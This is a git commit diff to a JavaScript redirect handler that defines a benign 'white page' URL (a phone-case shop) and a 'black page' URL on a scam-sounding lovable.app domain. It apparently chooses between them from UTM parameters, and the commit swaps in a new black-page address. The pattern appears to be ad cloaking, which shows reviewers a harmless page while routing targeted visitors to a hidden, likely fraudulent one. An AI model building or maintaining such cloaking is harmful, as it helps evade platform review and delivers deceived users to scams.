712ef4df0cfbf8b08b99ac9c1378f4b8e4fa1e9b
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-10-26 18:11:07 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://oncemovil.es/en/iphone-cases/3-13-chromatica-gradient-iphone-case.html#/5-phone_model-iphone15_pro/10-color-black";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
+    const blackPageURL = "https://casssshlov.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
